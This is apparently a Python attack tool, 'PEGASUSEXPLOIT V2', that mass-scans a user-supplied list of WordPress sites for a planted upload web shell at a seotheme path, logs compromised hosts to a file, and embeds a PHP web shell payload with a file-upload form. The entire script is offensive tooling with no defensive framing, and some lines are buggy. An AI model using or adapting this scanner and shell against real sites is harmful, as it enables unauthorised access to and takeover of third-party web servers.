import sys, requests, re, platform, os, colorama
from multiprocessing.dummy import Pool
from colorama import Fore,Style,init

init(autoreset=True)

try:
    os.system('title PEGASUSEXPLOIT V2 By : @killo_trojanz')
except:
    pass

def URLdomain(site):
    if not site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://","")
    pattern = re.compile('(.*)/')
    sitez = re.findall(pattern,site)
    try:
        site = sitez[0]
    except IndexError:
        if not type(sitez, list):
            site = sitez
        else:
            return False
    return site.strip()

def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/seotheme/db.php?u',headers=headers, allow_redirects=True,timeout=15)
        if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
                print('# ' + url + ' --> ' + fg + 'Exploited!' + Style.RESET_ALL)
                open('exploited.txt', 'a').write(url + '/wp-content/themes/seotheme/db.php?u\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/seotheme/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'input name="_upl" type="submit" id="_upl" value="Upload"' in check.content:
                    print('# ' + url + ' --> ' + fg + 'Exploited!' + Style.RESET_ALL)
                    open('exploited.txt', 'a').write(url + '/wp-content/themes/seotheme/db.php?u\n')
            else:
                print('# ' + url + ' --> ' + fr + 'Failed'+ Style.RESET_ALL)
    except:
        print('# ' + url + ' --> ' + fr + 'Failed' + Style.RESET_ALL)

        
            
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
print('\n\n  _____                               ______       __      _____  \n |  __ \\        \x1b[41;1m PEGASUSEXPOIT V2 \x1b[0m   |  ____|      \\ \\    / /__ \\ \n | |__) |__  __ _  __ _ ___ _   _ ___| |__  __  __  \\ \\  / /   ) |\n |  ___/ _ \\/ _` |/ _` / __| | | / __|  __| \\ \\/ /   \\ \\/ /   / / \n | |  |  __/ (_| | (_| \\__ \\ |_| \\__ \\ |____ >  <     \\  /   / /_ \n |_|   \\___|\\__, |\\__,_|___/\\__,_|___/______/_/\\_\\     \\/   |____|\n             __/ |    \x1b[42;1m Best High Wordpress Domain Quality Exploit \x1b[0m                   \n            |___/     \x1b[41;1m Copied By : @killo_trojanz \x1b[0m                                     \n                      \x1b[41;1m Turkey Hacker Team Project \x1b[0m  \n')

shell = '<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method=\'post\' enctype=\'multipart/form-data\'> <input type=\'file\' name=\'zb\'><input type=\'submit\' name=\'upload\' value=\'upload\'></form>"; if($_POST[\'upload\']) { if(@copy($_FILES[\'zb\'][\'tmp_name\'], $_FILES[\'zb\'][\'name\'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>'

requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 'referer': 'www.google.com'}
sr = input("Your list: ")

target = open(sr, "r").readlines()

try:
    target = [i.strip() for i in target]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')


if len(target) < 100:
    threads = len(target)
else:
    threads = 100
mp = Pool(threads)
mp.map(FourHundredThree, target)
print('\n [!] ' + fr + 'Done' + Style.RESET_ALL)